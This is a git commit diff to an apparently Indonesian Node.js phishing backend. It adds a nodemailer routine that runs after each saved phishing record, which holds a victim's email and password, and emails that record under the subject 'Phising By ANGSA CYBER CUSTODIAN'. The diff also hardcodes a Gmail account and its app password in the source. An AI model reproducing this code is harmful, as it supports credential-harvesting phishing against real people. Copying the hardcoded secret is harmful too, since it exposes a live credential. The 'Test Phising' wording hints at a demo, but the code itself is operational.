4fadb8ff4ecbd6a7e8bb0b3b837ee54556415f71
anggaalfiansah <anggaalfiansah26@gmail.com>
2022-08-19 16:41:31 +0700

    add send email phising

--- controllers/phising.controller.js
+++ controllers/phising.controller.js
@@ -1,4 +1,5 @@
 const PhisingData = require("../models/phising.model");
+const nodemailer = require("nodemailer");
 
 // Mendapatkan Semua Phising
 exports.getAllPhising = async (req, res) => {
@@ -23,6 +24,7 @@ exports.savePhising = async (req, res) => {
       usa_pswd,
     });
     await data.save().then(() => {
+      sendMail(data);
       res.status(200).json({
         data,
         message: `Phising Berhasil Disimpan`,
@@ -30,5 +32,36 @@ exports.savePhising = async (req, res) => {
     });
   } catch (error) {
     res.status(400).send("Gagal Menyimpan Data, ERR : " + error);
+  }
+};
+
+const sendMail = async (payload) => {
+  try {
+    // create reusable transporter object using the default SMTP transport
+    let transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: "mintanomorwhatsappnya@gmail.com",
+        pass: "botndoypyvuiprxz",
+      },
+    });
+
+    // send mail with defined transport object
+    let info = await transporter.sendMail({
+      from: "ANGSA CYBER CUSTODIAN", // sender address
+      to: payload?.usa_email, // list of receivers
+      subject: "Phising By ANGSA CYBER CUSTODIAN", // Subject line
+      text: "Test Phising", // plain text body
+      html: `<p>${payload}</p>`, // html body
+    });
+
+    console.log("Message sent: %s", info.messageId);
+    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
+
+    // Preview only available when sending through an Ethereal account
+    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
+  } catch (error) {
+    console.log(error);
   }
 };
